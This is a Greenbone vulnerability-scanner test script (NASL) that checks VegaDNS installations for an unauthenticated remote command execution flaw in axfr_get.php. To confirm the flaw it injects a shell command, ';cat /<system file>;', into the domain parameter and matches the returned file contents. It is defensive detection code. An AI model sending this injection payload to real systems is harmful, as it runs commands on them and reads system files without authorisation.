CPE = "cpe:/a:vegadns:vegadns";
if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.106275" );
	script_version( "2021-04-16T06:57:08+0000" );
	script_tag( name: "last_modification", value: "2021-04-16 06:57:08 +0000 (Fri, 16 Apr 2021)" );
	script_tag( name: "creation_date", value: "2016-09-22 09:06:56 +0700 (Thu, 22 Sep 2016)" );
	script_tag( name: "cvss_base", value: "6.4" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:P/I:P/A:N" );
	script_tag( name: "qod_type", value: "exploit" );
	script_tag( name: "solution_type", value: "VendorFix" );
	script_name( "VegaDNS Remote Command Execution Vulnerability" );
	script_category( ACT_ATTACK );
	script_copyright( "Copyright (C) 2016 Greenbone Networks GmbH" );
	script_family( "Web application abuses" );
	script_dependencies( "gb_vegadns_detect.sc", "os_detection.sc" );
	script_mandatory_keys( "vegadns/installed" );
	script_tag( name: "summary", value: "VegaDNS is prone to a remote command execution vulnerability." );
	script_tag( name: "vuldetect", value: "Tries to execute a command and checks the response." );
	script_tag( name: "insight", value: "The file axfr_get.php allows unauthenticated access and fails to correctly
  apply input escaping to all variables that is based on user input. This allows an attacker to inject shell
  syntax constructs to take control of the command execution." );
	script_tag( name: "impact", value: "An unauthorized attacker may execute arbitrary commands." );
	script_tag( name: "solution", value: "Update to VegaDNS 0.13.3. for updates." );
	script_xref( name: "URL", value: "https://www.exploit-db.com/exploits/40402/" );
	script_xref( name: "URL", value: "https://github.com/shupp/VegaDNS/blob/master/CHANGELOG" );
	script_xref( name: "URL", value: "http://www.vegadns.org/" );
	exit( 0 );
}
require("host_details.inc.sc");
require("os_func.inc.sc");
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("misc_func.inc.sc");
if(!port = get_app_port( cpe: CPE )){
	exit( 0 );
}
if(!dir = get_app_location( cpe: CPE, port: port )){
	exit( 0 );
}
if(dir == "/"){
	dir = "";
}
vtstrings = get_vt_strings();
files = traversal_files();
for pattern in keys( files ) {
	file = files[pattern];
	url = dir + "/axfr_get?hostname=" + vtstrings["lowercase"] + "&domain=%3bcat+/" + file + "%3b";
	if(http_vuln_check( port: port, url: url, pattern: pattern, check_header: TRUE )){
		report = http_report_vuln_url( port: port, url: url );
		security_message( port: port, data: report );
		exit( 0 );
	}
}
exit( 99 );

